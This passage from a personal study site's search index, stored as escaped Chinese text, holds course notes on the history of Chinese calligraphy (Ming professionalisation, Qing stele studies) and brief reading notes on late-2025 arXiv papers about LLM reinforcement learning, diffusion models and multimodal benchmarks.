<li>\u5e16\u5b66\u64c5\u957f\u7b80\u624e\u7684\u4e66\u5199\uff0c\u6574\u4f53\u4e0a\u98ce\u683c\u4fbf\u6377\u6d41\u7545</li> <li> <p>\u4fe1\u672d</p> </li> <li> <p>\u200b\u200b</p> </li> <li>\uff1f\u5e73\u9619\u9ad8\u9ad8\u4f4e\u4f4e</li> </ul>"},{"location":"ZJU-course/%E9%80%9A%E8%AF%86%E8%AF%BE%E7%A8%8B/%E4%B8%AD%E5%9B%BD%E4%B9%A6%E6%B3%95%E5%8F%B2/%E4%B8%AD%E5%9B%BD%E4%B9%A6%E6%B3%95%E5%8F%B2/#_7","title":"\u804c\u4e1a\u5316\u548c\u89c6\u89c9\u5316\uff1a\u660e\u4ee3\u7684\u4e66\u6cd5","text":"<ul> <li> <p>\u804c\u4e1a\u5316\uff0c\u4f1a\u53d7\u7edf\u6cbb\u8005\u5f71\u54cd</p> </li> <li> <p>\u6709\u4e24\u7c7b\uff0c\u804c\u4e1a\u4e66\u624b\u548c\u804c\u4e1a\u5316\u503e\u5411\u7684\u6587\u4eba</p> </li> <li>\u524d\u8005\u52aa\u529b\u5de5\u6574\uff0c\u540e\u8005\u52aa\u529b\u591a\u6837\u5316</li> <li>\u51fa\u73b0\u80cc\u666f\uff1a\u6c5f\u5357\u5730\u533a\u7ecf\u6d4e\u53d1\u8fbe\uff0c\u6587\u5316\u6d88\u8d39\u6d3b\u8dc3\uff0c\u4f46\u662f\u79d1\u4e3e\u65e0\u6cd5\u5438\u7eb3\u66f4\u591a\u4eba\u624d\uff0c\u5927\u91cf\u6587\u4eba\u6ede\u7559\uff0c\u4f9d\u9760\u4e66\u6cd5\u4f5c\u54c1\u7ef4\u751f</li> <li> <p>\u804c\u4e1a\u5316\u7684\u5f71\u54cd</p> <ul> <li>\u4e66\u5bb6\u6280\u80fd\u548c\u98ce\u683c\u591a\u6837\u5316\uff0c\u9700\u8981\u5b66\u4f1a\u5f88\u591a\u79cd\u5b57\u4f53\u548c\u4e0d\u540c\u5b57\u4f53\u7684\u4e0d\u540c\u98ce\u683c\u7684\u80fd\u529b</li> <li>\u4e66\u5bb6\u548c\u753b\u5bb6\u96c6\u4f53\u51fa\u73b0\u5728\u4e00\u4e9b\u5b9a\u5236\u578b\u4f5c\u54c1\u4e2d\uff0c\u5982\u9001\u522b\uff0c\u795d\u8d3a\u7b49\uff0c\u4fc3\u8fdb\u4e86\u5730\u65b9\u6d41\u6d3e\u7684\u4ea7\u751f</li> <li>\u4f2a\u9020\u7684\u76db\u884c</li> <li>\u804c\u4e1a\u5316\u9700\u8981\u8f83\u4e3a\u7a33\u5b9a\u7684\u4e2a\u4eba\u98ce\u683c\uff0c\u82cf\u5dde\u4e66\u5bb6\u90fd\u4ee5\u5b66\u4e60\u6587\u5fb5\u660e\u65f6\u5c1a\uff0c\u83b7\u53d6\u7ecf\u6d4e\u5229\u76ca\u7684\u65f6\u5019\uff0c\u521b\u9020\u6027\u53d7\u635f</li> </ul> </li> <li> <p>\u5434\u95e8\u4e66\u6d3e </p> </li> <li> <p>\u751f\u6d3b\u5728\u82cf\u5dde\uff0c\u6c5f\u5357\u5730\u533a\u7ecf\u6d4e\u53d1\u8fbe\uff0c\u6559\u80b2\u9886\u5148\u5bfc\u81f4\u79d1\u4e3e\u8fc7\u5269</p> </li> <li>\u662f\u4e2d\u56fd\u4e66\u6cd5\u53f2\u4e0a\u7b2c\u4e00\u4e2a\u5730\u57df\u6d41\u6d3e</li> <li>\u98ce\u683c\u4e0a\u7cbe\u96c5\u548c\u6d41\u8361\u4e92\u76f8\u6fc0\u8361</li> <li> <p>\u200b\u200b</p> </li> <li> <p>\u660e\u4ee3\u665a\u671f\u53c8\u6709\u4e86\u89c6\u89c9\u5316</p> </li> <li> <p>\u5947\u7684\u91cd\u89c6\uff0c\u591a\u5143\u793e\u4f1a\uff0c\u897f\u65b9\u6587\u5316\u7684\u4f20\u5165\uff0c\u5f00\u59cb\u8ffd\u6c42\u89c6\u89c9\u4e0a\u7684\u5947</p> </li> <li>\u5efa\u7b51\u6837\u5f0f\u6539\u53d8\uff0c\u623f\u5c4b\u53d8\u9ad8\uff0c\u8981\u8fdc\u89c2</li> <li>\u5b57\u5e16\u53d8\u5f97\u5f88\u5927</li> <li>\u7528\u5728\u9ad8\u5802\u7acb\u8f74\u4e0a\uff0c\u5b57\u7684\u5c3a\u5ea6\u53d8\u5f97\u975e\u5e38\u5927\uff0c\u5199\u5b57\u672c\u8eab\u4e5f\u53d8\u5f97\u5f88\u6709\u8868\u6f14\u6027</li> <li>\u6742\u4e66\u5377\u518c\u7684\u6d41\u884c\uff0c\u4e3a\u4e86\u5438\u5f15\u89c2\u4f17\uff0c\u4e00\u672c\u624b\u5377\u518c\u5b50\u91cc\uff0c\u7528\u4e0d\u540c\u7684\u4e66\u4f53\uff0c\u5927\u5c0f\uff0c\u98ce\u683c\uff0c\u884c\u6b3e\u6765\u5b8c\u6210</li> <li>\u5927\u91cf\u662f\u7528\u5947\u5b57\uff0c\u6765\u6784\u5efa\u964c\u751f\u611f\u548c\u65b0\u9c9c\u611f</li> <li> <p>\u5c0f\u5927\u4e4b\u53d8 \u7acb\u8f74\u4e66\u6cd5\uff0c\u53d8\u5927</p> </li> <li> <p>\u7acb\u8f74\u4e66\u6cd5\u53d8\u6210\u6700\u4e3a\u91cd\u8981\u7684\u4e66\u5199\u5f62\u5f0f</p> </li> <li>\u800c\u7ecf\u5178\u8303\u672c\u57fa\u672c\u90fd\u662f\u5bf8\u4ee5\u5185\u7684\u884c\u8349\u4e66\uff0c\u56e0\u6b64\u5728\u4e34\u4e60\u7684\u65f6\u5019\u9700\u8981\u5c06\u8303\u672c\u4e0a\u7684\u5b57\u62d3\u800c\u5927\u4e4b</li> <li>\u6700\u4e3a\u6df1\u523b\u7684\u53d8\u5316\uff0c\u4f20\u7edf\u5e16\u5b66\u53d1\u800c\u4e2d\u8282\u7684\u7cbe\u5de7\u8da3\u5473\u9010\u6e10\u4e3a\u6574\u4f53\u611f\u3001\u6c14\u52bf\u4e0e\u590d\u6742\u7684\u753b\u9762\u5c42\u6b21\u6240\u53d6\u4ee3</li> <li> <p>\u5148\u719f\u540e\u751f</p> </li> <li> <p>\u719f\u662f\u6307\u7cbe\u719f\uff0c\u4f20\u7edf\u4e66\u5b66\u7684\u57fa\u672c\u8981\u6c42</p> </li> <li>\u751f\u662f\u6307\u719f\u540e\u751f\uff0c\u719f\u662f\u524d\u63d0\uff0c\u5728\u6b64\u57fa\u7840\u4e0a\u8ffd\u6c42\u4e0e\u8303\u672c\u4e0d\u540c\u7684\u8da3\u5473\uff0c\u4e0d\u53ca\uff0c\u4e0d\u5230\u4f4d\u7684\u8da3\u5473\uff0c\u662f\u7387\u610f\u5bf9\u4f5c\u610f\u7684\u4e00\u79cd\u8d85\u8d8a\uff0c\u6709\u79cd\u6e05\u65b0\u4e4b\u79c0\u7f8e</li> <li> <p>\u6e05\u4ee3\u7891\u5b66\u4ee5\u540e\uff0c\u4eba\u4eec\u6448\u5f03\u4e86\u201c\u719f\u201d\uff0c\u800c\u5c06\u201c\u751f\u201d\u3001\u201c\u751f\u62d9\u201d\u3001\u201c\u7a1a\u62d9\u201d\u4f5c\u4e3a\u65b0\u7684\u7f8e\u5b66\u8ffd\u6c42\uff0c\u662f\u5728\u8463\u5176\u660c\u7684\u57fa\u7840\u4e0a\u53c8\u5411\u524d\u63a8\u8fdb\u4e86\u4e00\u5927\u6b65\u3002</p> </li> <li> <p>\u8bbf\u7891 </p> </li> <li> <p>\u76ee\u7684\u662f\u6b63\u7ecf\u8865\u53f2</p> </li> <li>\u5bfb\u627e\u8bb0\u5f55\u690e\u62d3\u53e4\u4ee3\u7684\u91d1\u77f3\u6587\u5b57</li> <li>\u6284\u5f55 \u8bbf\u5230\u7684\u7891\u4e00\u822c\u90fd\u662f\u7b2c\u4e00\u624b\u8d44\u6599\uff0c\u4e0d\u5bb9\u6613\u51fa\u9519\uff0c\u5229\u4e8e\u5b66\u672f\u7814\u7a76</li> <li>\u671f\u95f4\u5927\u91cf\u7684\u91d1\u77f3\u7891\u53d1\u73b0\u4f20\u64ad\uff0c\u79f0\u4e3a\u4e86\u4e66\u5bb6\u7684\u53d6\u6cd5\u8d44\u6599</li> <li> <p>\u62d3\u672c </p> </li> <li> <p>\u5c06\u7eb8\u5f20\u653e\u5728\u9752\u94dc\u5668\uff0c\u7891\u77f3\uff0c\u5e16\u77f3\u8868\u9762\uff0c\u901a\u8fc7\u690e\u51fb\u3001\u58a8\u62d3\u7684\u65b9\u5f0f\u6240\u83b7\u5f97\u7684\u590d\u5236\u54c1\uff0c\u88ab\u6210\u4e3a\u62d3\u672c\u3002</p> </li> <li>\u6709\u88c5\u88f1\u548c\u4e0d\u88c5\u88f1\uff0c\u6709\u7684\u5b57\u539f\u7248\u592a\u5927\uff0c\u4f1a\u62d3\u5b8c\u4e4b\u540e\u526a\u4e0b\u6765</li> <li>\u662f\u53e4\u4ee3\u4e66\u6cd5\u7684\u8f7d\u4f53\uff0c\u4e5f\u662f\u6536\u85cf\u548c\u6b23\u8d4f\u7684\u5bf9\u8c61</li> <li> <p>\u7891\u5b66  \u7891\u5b66\u548c\u5e16\u5b66\u7684\u6982\u5ff5\u5728\u665a\u6e05\u5eb7\u6709\u4e3a\uff0c\u6709\u4e9b\u89c2\u5ff5\u5c71\u7684\u7d0a\u4e71</p> </li> <li> <p>\u5e7f\u4e49\u4e0a\u662f\u6307\u53d6\u6cd5\u5510\u4ee5\u524d\u7684\u91d1\u77f3\u4f5c\u54c1\uff0c\u72ed\u4e49\u4e0a\u5c31\u662f\u5317\u671d\u7891\u523b</p> </li> <li>\u200b\u200b</li> <li>\u7891\u5b66\u4e2d\u7684\u5173\u952e\u662f\u91d1\u77f3\u5668  \u7cbe\u81f4\u6d41\u7545\uff08\u738b\u7fb2\u4e4b\uff0c\u7c73\u82be\u90a3\u7c7b\uff09</li> <li>\u8bbf\u7891+\u5b66\u672f\uff0c\u5e16\u5b66\u7684\u8870\u843d</li> <li>\u7891\u5b66 \u7684\u4e66\u6cd5\u72b6\u6001\u7684\u6539\u53d8</li> <li> <p>\u91d1\u77f3\u6c14</p> </li> <li> <p>\u5728\u6e05\u4ee3\u7891\u5b66\u7684\u53d1\u5c55\u8fc7\u7a0b\u4e2d\uff0c\u4eba\u4eec\u6b63\u5728\u9752\u94dc\u5668\u548c\u77f3\u523b\u62d3\u672c\u4e2d\u611f\u53d7\u5230\u4e00\u79cd\u7269\u8d28\u6027\u7684\u8da3\u5473</p> </li> <li>\u6b8b\u7834\uff0c\u9508\u8680\uff0c\u5f00\u59cb\u5f71\u54cd\u4eba\u4eec\u5bf9\u4e8e\u91d1\u77f3\u6587\u5b57\u4e66\u5199\u7684\u7406\u89e3</li> <li>\u5f00\u59cb\u653e\u5f03\u7cbe\u81f4\u6d41\u7545\u548c\u516b\u9762\u51fa\u950b\uff0c\u8ffd\u6c42\u4e2d\u950b\u548c\u85cf\u5934\u62a4\u5c3e\uff0c\u539a\u91cd\u6d51\u6734</li> <li> <p>\u7891\u5b66\u53d1\u5c55\u7684\u7406\u8bba\u63a8\u8fdb\u6096\u8bba</p> </li> <li> <p>\u7891\u5b66\u7684\u53d1\u5c55\u662f\u5e16\u5b66\u8870\u843d\u7684\u7ed3\u679c\uff0c\u5e16\u5b66\u548c\u53e4\u4ee3\u4e66\u5bb6\u771f\u5b9e\u7684\u5199\u6cd5\u7684\u8d34\u5408\u5ea6\u6536\u5230\u4e4b\u4e00</p> </li> <li>\u200b\u200b</li> <li>\u962e\u5143\uff1a\u5357\u5317\u4e66\u6d3e\u8bba\u7b49\u7b49</li> <li> <p>\u6096\u8bba\u5728\u4e8e  \u53e4\u4ee3\u7a76\u7adf\u54ea\u4e9b\u4e0d\u662f\u4e66\u6cd5</p> </li> <li> <p>\u4e8c\u5341\u4e16\u7eaa  \u4e8c\u738b\u4e4b\u5916\u6709\u4e66\uff0c\u4ec0\u4e48\u4e66\u4e0d\u662f\u4e66\uff0c\u4ec0\u4e48\u4e1c\u897f\u662f\u4e66\u6cd5</p> </li> <li> <p>\u5927\u591a\u4e3a\u65e0\u540d\u6c0f\u4e66\u6cd5\uff0c\u5ef6\u7eed\u4e86\u6e05\u4ee3</p> </li> <li>\u200b\u200b</li> </ul>"},{"location":"ZJU-course/%E9%80%9A%E8%AF%86%E8%AF%BE%E7%A8%8B/%E4%B8%AD%E5%9B%BD%E4%B9%A6%E6%B3%95%E5%8F%B2/%E4%B8%AD%E5%9B%BD%E4%B9%A6%E6%B3%95%E5%8F%B2/#_8","title":"\u6e05\u4ee3\u7684\u7891\u5b66\u7684\u840c\u82bd\u4e0e\u5d1b\u8d77","text":"<p>\u5c1a\u53e4\u4e4b\u98ce</p> <p>\u5bf9\u4e8e\u665a\u660e\u591a\u6709\u6279\u8bc4\uff0c\u987e\u708e\u6b66\u6279\u8bc4\u4eba\u591a\u7be1\u6539\u53e4\u4e66\uff0c\u4e0d\u4ece\u7ecf\u5178\uff0c\u56e0\u6b64\u4eba\u5fc3\u90aa</p> <p>\u6c64\u658c\u5199\u4e86\u7981\u6b62\u79c1\u523b\u975e\u4f20\u7edf\u5c0f\u8bf4\u7684\u6587\u7ae0</p> <p>\u53cd\u5e94\u5728\u4e66\u6cd5\u4e0a\u5c31\u662f\u8bbf\u7891\u8fd0\u52a8\u7684\u5174\u8d77\uff0c\u5f00\u59cb\u5bfb\u8bbf\u90a3\u4e9b\u5c71\u6797\u4e4b\u95f4\u7684\u53e4\u4ee3\u7891\u523b</p> <p>\u90ed\u5b97\u660c\u6536\u85cf\u62d3\u672c\u548c\u5370\u7ae0</p> <p>\u8bbf\u7891</p> <p>\u987e\u708e\u6b66\u540e\u5230\u5317\u65b9\u8bbf\u7891\uff0c\u5bf9\u53ef\u8bfb\u8005\u90fd\u6284\u5f55\uff0c\u5176\u5f1f\u5b50\u8ba4\u4e3a\u4e0d\u4ec5\u6709\u5b57\u8bcd\u5178\u96c5\u8fd8\u6709\u5b57\u753b\u7cbe\u5999</p> <p>\u987e\u708e\u6b66\u5728\u8bbf\u7891\u4e4b\u540e\uff0c\u4e5f\u53d1\u6398\u4e86\u53e4\u7891\u4e66\u6cd5\u7684\u53e4\u6734\u6b8b\u7834\u62d9\u7f8e\uff0c\u53e4\u62d9\u6210\u4e86\u6e05\u4ee3\u91cd\u8981\u7684\u5ba1\u7f8e\u8da3\u5473</p> <p>\u7891\u5b66\u548c\u5e16\u5b66\u7684\u53d1\u5c55\uff0c\u7891\u5b66\u5bf9\u5e94\u975e\u540d\u5bb6\uff0c\u5e16\u5b66\u5bf9\u5e94\u540d\u5bb6</p> <p>\u4f46\u662f\u987e\u708e\u6b66\u4e5f\u8ba4\u4e3a\uff0c\u4e00\u5473\u5730\u501f\u7528\u53e4\u4ee3\u7528\u8bcd\uff0c\u5176\u5b9e\u662f\u5f88\u6d45\u8584\u7684</p> <p>\u7591\u7ecf\u4e4b\u59cb</p> <p>\u5f00\u59cb\u5bf9\u4e8e\u5510\u4ee3\u4e09\u56fd\u6279\u5224\uff0c\u6c49\u4ee3\u7684\u5174\u8d77</p> <p>\u5317\u671d\u7559\u4e0b\u4e86\u5f88\u591a\u5893\u5fd7\u94ed</p> <p>\u96b6\u4e66\u8f83\u4e3a\u6574\u6d01\uff0c\u5c11\u7b14\u950b</p> <p>\u300a\u5357\u5317\u4e66\u6d3e\u8bba\u300b</p> <p>\u5510\u592a\u5b97\u5d07\u5c1a\u5357\u6d3e\u7684\u738b\u7fb2\u4e4b</p> <ul> <li>\u5357\u6d3e \u758f\u653e\u598d\u5999 \u738b \u8d75\u5b5f\u982b</li> <li> <p>\u5317\u6d3e \u4e2d\u539f\u53e4\u6cd5 \u6b27 \u989c</p> </li> <li> <p>\u6977\u4e66</p> </li> <li>\u884c\u4e66 \u738b\u7fb2\u4e4b</li> <li>\u8349\u4e66</li> </ul> <p>\u5b8b\u4ee3\u5b66\u8005\u8ba4\u4e3a\u5510\u521d\u4e66\u5bb6\u90fd\u662f\u738b\u7fb2\u4e4b\u6d3e\uff0c\u4f46\u5b9e\u9645\u4e0a\u4e5f\u6709\u5317\u6d3e</p> <p>\u4e0d\u80fd\u7528\u5170\u4ead\u5e8f\u6765\u6982\u62ec\u4e1c\u664b\u7684\u6240\u6709\u7684\u4e66\u6cd5\u4f53\u7cfb\uff0c\u4f46\u5b9e\u9645\u4e0a\u962e\u5143\u627e\u5230\u662f\u5f53\u65f6\u7684\u5e73\u6c11\u4e66\u6cd5</p> <ul> <li>\u96b6\u4e66\u7684\u7279\u8272</li> <li>\u6977\u4e66\u7684\u7279\u8272</li> </ul> <p>\u962e\u5143\u8ba4\u4e3a\u6b27\uff0c\u989c\u90fd\u662f\u4ece\u5317\u6d3e\u800c\u6765\uff0c\u5317\u6cd5\u4e3a\u53e4\uff0c\u5357\u6d3e\u4e3a\u76ae\uff0c\u751a\u81f3\u7f8e\u8a89\u8d85\u8fc7\u4e86\u738b\u7fb2\u4e4b</p> <p>\u4ee5\u524d\u8fd0\u7b14\u6709\u4e94\u79cd \u5bf9\u5e94\u4e94\u4e2a\u624b\u6307</p> <p>\u9093\u77f3\u5982 \u7bc6\u4e66+\u5206\u4e66+\u771f\u4e66 \u843d\u7b14\u5cfb \u884c\u58a8\u6da9 \u4e94\u6307\u9f50\u529b</p> <p>\u4f55\u7ecd\u57fa \u843d\u7b14\u7279\u8272</p> <p>\u5e16\u5b66\u548c\u7891\u5b66</p> <p>\u5eb7\u6709\u4e3a\uff1a\u9b4f\u7891\u65e0\u4e0d\u4f73\u8005\uff0c</p> <ul> <li> <p>\u7891\u5b66 \u8d77\u6e90\u5f88\u665a</p> </li> <li> <p>\u72ed\u4e49\u662f\u6307 \u665a\u6e05\u4ee5\u540e\u53d6\u6cd5\u5317\u9b4f\u7684\u4e66\u6cd5</p> </li> <li>\u5e7f\u4e49\u662f\u6307  \u660e\u672b\u4ee5\u540e\u53d6\u6cd5\u5510\u4ee3\u4ee5\u524d</li> </ul> <p>\u5411\u51fa\u571f\u6587\u5b57\u5b66\u4e60\u4e66\u6cd5\uff08\u591a\u4e3a\u65e0\u540d\u6c0f\u4e66\u6cd5\uff09\u5747\u5728\u7891\u5b66\u8303\u7574\u4e4b\u5185</p> <p>\u6e05\u4ee3\u7891\u5b66\u5bf9\u540e\u4ee3\u4e66\u6cd5\u6700\u5927\u8d21\u732e\u4e4b\u4e00\u662f\u201c\u4e8c\u738b\u4e4b\u5916\u6709\u4e66\u7684\u601d\u60f3\u201d</p> <p>\u5bf9\u4e8e\u51fa\u571f\u6587\u5b57\uff0c\u6211\u4eec\u9700\u8981\u601d\u8003\u51fa\u571f\u6587\u5b57\u672c\u8eab\u7684\u6027\u8d28\uff0c\u56e0\u4e3a\u5b83\u4eec\u672c\u8eab\u662f\u4e8e\u90a3\u4e9b\u4fdd\u7559\u4e0b\u6765\u7684\u540d\u5bb6\u5bab\u5ef7\u4f5c\u54c1\u80af\u5b9a\u662f\u6709\u533a\u522b\u7684</p> <p>\u6c11\u95f4\u4e66\u6cd5\u7684\u7406\u8bba\uff0c\u5b58\u5728\u88ab\u53cd\u9a73\u7684\u601d\u8003\uff0c\u4ec0\u4e48\u662f\u6c11\u95f4\uff0c\u533a\u5206\u65e5\u5e38\u4e66\u5199\u548c\u6b63\u5f0f\u573a\u5408\u7684\u4e66\u5199</p>"},{"location":"reading/dailyreading/2025-10/","title":"2025 10","text":"<ul> <li>Memory\u662f\u600e\u4e48\u505a\u7684</li> <li>\u5e26\u6709\u5386\u53f2\u7684rollout\uff0c\u8ba9rollout\u6709\u66f4\u591aexploration</li> </ul>"},{"location":"reading/dailyreading/2025-11/","title":"2025 11","text":""},{"location":"reading/dailyreading/2025-11/#1111","title":"11.11","text":"<ul> <li>https://arxiv.org/abs/2511.05271<ul> <li>DeepEyes\uff1a\u7c7b\u4f3c\u4e8eReTool\u7684\u589e\u5f3a\u7248\uff0c\u589e\u52a0\u4e86code\uff0csearch\u5de5\u5177\u4ee5\u53ca\u6a21\u578b\u539f\u751f\u7684\u591a\u6a21\u6001\u80fd\u529b\uff0c\u505aSFT+RL</li> <li>\u5f00\u6e90\u4e86SFT\u548cRL data</li> </ul> </li> <li>https://arxiv.org/abs/2511.04662<ul> <li>VeriCot\uff1a\u505a\u8fc7\u7a0b\u76d1\u7763\uff0c\u4e3b\u8981\u76ee\u6807\u662f\u76d1\u7763Cot\uff0c\u76ee\u524d\u7684\u76d1\u7763\u65b9\u6848\u5f80\u5f80\u53ea\u76d1\u7763\u7ed3\u679c\uff0c\u4f46\u662f\u9762\u5bf9Cot\u4e2d\u7684\u51fa\u73b0\u7684\u9519\u8bef\u903b\u8f91\u89c6\u800c\u4e0d\u89c1\uff0c\u5176\u5c06Cot\u7684\u81ea\u7136\u8bed\u8a00\u7ffb\u8bd1\u6210SMT-LIB\u4e00\u9636\u903b\u8f91\u516c\u5f0f\uff0c\u6765\u505a\u5f62\u5f0f\u5316\u7684\u9a8c\u8bc1</li> <li>\u8fd9\u4e2a\u5c06Cot\u7ffb\u8bd1\u6210\u903b\u8f91\u516c\u5f0f\u7684\u8fc7\u7a0b\u662fLLM\u505a\u7684</li> </ul> </li> <li>https://arxiv.org/abs/2511.03506<ul> <li>HaluMem\uff1a\u4e00\u4e2abenchmark\uff0c\u7528\u4e8e\u8bc4\u4f30\u4e00\u4e2aMemory\u7cfb\u7edf\u7684\u5e7b\u89c9\u7387</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-11/#1112","title":"11.12","text":"<ul> <li>https://arxiv.org/abs/2511.06221<ul> <li>VibeThinker\uff1a\u5c0f\u6a21\u578b\u80fd\u5426\u6fc0\u53d1\u51fa\u8d85\u8fc7\u5343\u4ebf\u7ea7\u522b\u7684\u5927\u6a21\u578b\u7684\u63a8\u7406\u80fd\u529b\uff0c\u8fd9\u4e2a\u771f\u662f\u8bed\u8a00\u6a21\u578b\u4e86\uff0c1.5B\u7684\u5c0f\u6a21\u578b\uff0c\u5728AIME\u7b49\u591a\u4e2abenchmark\u4e0a\u8d85\u8fc7\u4e86R1</li> <li>\u6fc0\u53d1\u63a8\u7406\u80fd\u529b\uff0c\u5728SFT\u9636\u6bb5\u9f13\u52b1\u63a2\u7d22\u662f\u5173\u952e</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-11/#1113","title":"11.13","text":"<ul> <li>https://relieved-cafe-fe1.notion.site/JustRL-Scaling-a-1-5B-LLM-with-a-Simple-RL-Recipe-24f6198b0b6b80e48e74f519bfdaf0a8 <ul> <li>JustRL\uff1a\u5c55\u73b0\u4e86\u5728\u7b80\u5355\u914d\u7f6e\u4e0bRL\u80fd\u591f\u8fbe\u5230\u7684\u4e0a\u9650\uff0c\u5bf9\u6bd4\u53ef\u4ee5\u5224\u65ad\u4e00\u4e9b\u7279\u6b8a\u7684\u6280\u5de7\u662f\u5426\u771f\u7684\u63d0\u9ad8\u4e86\u4e0a\u9650\uff0c\u800c\u4e0d\u662fbaseline\u505a\u7684\u4e0d\u591f\u5145\u5206 </li> </ul> </li> </ul> <p>\u4e2a\u4eba\u8ba4\u4e3a\u6700\u91cd\u8981\u662f\u71b5\u7684\u6b63\u5e38\u4e0a\u4e0b\u6ce2\u52a8\uff0c\u6ca1\u6709\u63a2\u7d22\u5d29\u6e83\u6216\u8005\u8fc7\u65e9\u6536\u655b\uff0c\u5176\u5728\u6d88\u878d\u5b9e\u9a8c\u4e2d\u8868\u793a\uff0c\u5e38\u89c1\u7684\u56de\u590d\u8fc7\u957f\u7684\u6291\u5236\uff0c\u53cd\u800c\u662f\u4f7f\u5f97Entropy\u7684\u53ef\u80fd\u539f\u56e0\u4e4b\u4e00</p> <p>\u4f46\u662f\u8fd9\u4e2a\u8bba\u6587\u6ca1\u6709\u7ecf\u8fc7\u5145\u5206\u7684\u5b9e\u9a8c\u7684\u5bf9\u6bd4\uff0c\u4ee5\u53ca\u5728\u4e0d\u540c\u5c3a\u5bf8\uff0c\u4e0d\u540c\u57fa\u5ea7\u7684\u6a21\u578b\uff0c\u4e0d\u540c\u573a\u666f\u7684\u8fdb\u884c\u8bad\u7ec3\u7684\u7ed3\u679c\uff0c\u4ec5\u4ec5\u662f\u5728\u4e00\u4e2a\u573a\u666f\uff0c\u672a\u5fc5\u80fd\u591f\u5f97\u5230\u666e\u9002\u7684\u7ed3\u8bba</p> <ul> <li>https://arxiv.org/abs/2511.08923<ul> <li>TiDar\uff1a\u7528\u6269\u6563\u6a21\u578b\u8fdb\u884c\u8d77\u8349\uff0c\u7136\u540e\u7528AR\u6765\u8f93\u51fa\u7ed3\u679c\uff08\u7ec4\u7ec7\u8bed\u8a00\uff09\uff0c\u7b2c\u4e00\u4e2a\u5c06Dllm\u7684\u8f93\u51fa\u8d28\u91cf\u62c9\u5230\u548cAR\u6a21\u578b\u540c\u4e00\u6c34\u5e73\u7ebf\u7684</li> </ul> </li> <li>https://arxiv.org/abs/2511.08633<ul> <li>Time to Move\uff1a\u53ef\u63a7\u89c6\u9891\u751f\u6210\uff0c\u5355\u9760\u6587\u672c+\u521d\u59cb\u5e27\u65e0\u6cd5\u505a\u5230\u6709\u6548\u7684\u53ef\u63a7\u89c6\u9891\u751f\u6210\uff0c\u56e0\u6b64\u672c\u6587\u63d0\u51fa\u4e86\u4e00\u4e2a\u65b0\u7684\u65b9\u6848\uff08\u6ca1\u6709\u5b8c\u5168\u770b\u61c2\uff09</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-11/#1118","title":"11.18","text":"<ul> <li>https://arxiv.org/abs/2511.09146<ul> <li>Dope \u4e00\u79cd\u65b0\u7684\u4f4d\u7f6e\u7f16\u7801\u65b9\u5f0f\uff0c\u4e00\u79cd\u65e0\u9700\u8bad\u7ec3\u7684\u65b9\u5f0f\uff0c\u53ef\u4ee5\u5373\u63d2\u5373\u7528\uff0c\u5177\u4f53\u7684\u5b9e\u73b0\u8fd8\u6ca1\u7406\u89e3\u6e05\u695a</li> </ul> </li> <li>https://arxiv.org/abs/2511.11434<ul> <li>WEAVE benchmark\uff0c\u9488\u5bf9\u4e8e\u540c\u4e00\u751f\u6210\u7406\u89e3\u7684\u591a\u6a21\u6001\u5927\u6a21\u578b\u7684benchmark\uff0c\u4fa7\u91cd\u4e8e\u591a\u8f6e\u5bf9\u8bdd</li> </ul> </li> <li>https://arxiv.org/abs/2511.11062<ul> <li>LiteAttention \u4e00\u79cd\u9488\u5bf9\u4e8eDit\u7684Flash Attention\u7684\u6539\u8fdb\u673a\u5236\uff0c\u4e3b\u8981\u9488\u5bf9\u4e8e\u65f6\u8bc4\u751f\u6210</li> </ul> </li> <li>https://arxiv.org/abs/2511.09611<ul> <li>MMaDA-Parallel \u591a\u6a21\u6001\u7684Dllm\uff0c\u6b64\u6b21\u53c8\u505a\u4e86\u4e00\u4e2a\u65b0\u7684bench\uff0c\u6765\u4f53\u73b0\u81ea\u56de\u5f52\u8303\u5f0f\u4e2d\u6bd4\u8f83\u4e25\u91cd\u7684\u9519\u8bef\u7d2f\u79ef\u95ee\u9898</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-11/#1119","title":"11.19","text":"<ul> <li>https://arxiv.org/abs/2511.10555<ul> <li>CoTyle \u751f\u6210\u7684\u98ce\u683c\u63a7\u5236\uff0c\u5728\u6587\u751f\u56fe\u8fd9\u4e2a\u9886\u57df\u8981\u505a\u98ce\u683c\u63a7\u5236\u5f80\u5f80\u8981\u505a\u5f88\u590d\u6742\u7684\u63d0\u793a\u8bcd\u5de5\u7a0b\uff0c\u96be\u5ea6\u9ad8\u4e14\u6d6a\u8d39\u8d44\u6e90</li> <li>\u5728CoTyle\u7684\u8303\u5f0f\u4e2d\uff0c\u4f7f\u7528\u4e00\u4e2a\u6570\u5b57\u6765\u505a\u98ce\u683c\u5316\u7684\u63a7\u5236\uff0c\u8bad\u7ec3\u4e86\u4e00\u4e2aStyle Codebook\uff0c\u6765\u5c06\u6570\u5b57\u8f6c\u6362\u6210\u98ce\u683c\u5d4c\u5165\uff0c\u5c06\u8fd9\u4e2a\u5d4c\u5165\u548c\u6587\u672c\u5d4c\u5165\u4e00\u8d77\u8bad\u7ec3\u751f\u6210\u6a21\u578b</li> </ul> </li> <li>https://arxiv.org/abs/2511.14582<ul> <li>OmniZip\uff1a\u76ee\u6807\u662f\u5728Omni\u6a21\u578b\u4e2d\u6709\u6548\u5730\u538b\u7f29\u97f3\u9891+\u89c6\u9891Token</li> <li>\u97f3\u9891+\u89c6\u9891\u8054\u52a8\u5730\u8fdb\u884c\u526a\u679d </li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-11/#1126","title":"11.26","text":"<ul> <li>https://arxiv.org/abs/2511.19428v1<ul> <li>Flow-Map\uff0c\u5bf9\u4e8eFlow Model\u505a\u84b8\u998f\u7684\u65f6\u5019\uff0c\u4e0d\u9700\u8981\u663e\u5f0f\u7684\u6570\u636e\uff0c\u800c\u662f\u6839\u636e\u6559\u5e08\u6a21\u578b\u5728\u67d0\u4e00\u70b9\u7684ode\u901f\u5ea6\u8fdb\u884c\u84b8\u998f\uff0c\u56e0\u6b64\u8fd9\u662f\u4e00\u79cddata free\u7684\u65b9\u6848</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-12/","title":"2025 12","text":""},{"location":"reading/dailyreading/2025-12/#123","title":"12.3","text":"<ul> <li>https://arxiv.org/abs/2512.03036<ul> 